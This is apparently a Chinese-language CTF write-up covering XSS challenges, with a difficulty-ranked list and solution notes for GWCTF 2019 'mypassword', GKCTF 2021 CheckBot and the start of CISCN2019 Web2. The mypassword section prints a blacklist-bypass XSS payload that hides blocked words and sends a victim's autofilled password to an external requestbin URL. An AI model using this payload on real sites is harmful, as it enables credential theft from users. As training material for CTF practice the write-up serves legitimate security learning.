[toc]

## XSS

### 简单

-   

### 签到

-   [GWCTF 2019]mypassword
-   [GKCTF 2021]CheckBot GKCTF0解题目，难度不用我多说了吧 考的是个tricks

### 中等

-   [CISCN2019 华东北赛区]Web2
-   [网鼎杯 2020 青龙组]notes
-   [Zer0pts2020]musicblog
-   [安洵杯 2019]cssgame xs-lerk 通过css的正则带出flag
-   math-is-fun1 css外带

### 困难

-   [SCTF2019]Math-IS-Fun-2 上面那道题的加强版？实际上没有反看到WP
-   [QWB2021 Quals]HardXSS hardxxe【

# [GWCTF 2019]mypassword

登陆前，js文件：

```javascript
if (document.cookie && document.cookie != '') {
	var cookies = document.cookie.split('; ');
	var cookie = {};
	for (var i = 0; i < cookies.length; i++) {
		var arr = cookies[i].split('=');
		var key = arr[0];
		cookie[key] = arr[1];
	}
	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
		document.getElementsByName("username")[0].value = cookie['user'];
		document.getElementsByName("password")[0].value = cookie['psw'];
	}
}
```

注册个号进去，源码里部分：

```php
if(is_array($feedback)){
	echo "<script>alert('反馈不合法');</script>";
	return false;
}
$blacklist = ['_',''','&','\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
			foreach ($blacklist as $val) {
		        while(true){
		            if(stripos($feedback,$val) !== false){
		                $feedback = str_ireplace($val,"",$feedback);
		            }else{
		                break;
		            }
		        }
		    }
```

过滤的东西，是xss无疑了。

构造一个表单：

```html
<incookieput type="text" name="username">
<incookieput type="password" name="password">
<scrcookieipt scookierc="./js/login.js"></scrcookieipt>
<scrcookieipt>
    var psw = docucookiement.getcookieElementsByName("password")[0].value;
    docucookiement.locacookietion="http://http.requestbin.buuoj.cn/sxm9dysx/?a="+psw;
</scrcookieipt>
```

直接出flag

# [GKCTF 2021]CheckBot GKCTF

这题感觉有点问题，访问admin.php，POST，直接出flag？？？

# [CISCN2019 华东北赛区]Web2

有admin.php

注册个账号登进去，